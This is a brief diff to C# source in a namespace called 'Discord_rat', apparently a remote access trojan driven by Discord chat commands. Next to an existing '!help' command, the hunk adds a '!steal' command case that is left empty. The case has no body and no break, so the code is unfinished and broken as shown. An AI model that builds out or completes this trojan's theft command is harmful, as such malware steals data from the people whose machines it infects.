@@ -1264,6 +1264,8 @@ namespace Discord_rat
                 case "!help":
                     await helpmenu(ChannelId);
                     break;
+               case "!steal": 
+                  
             }
         }
    }
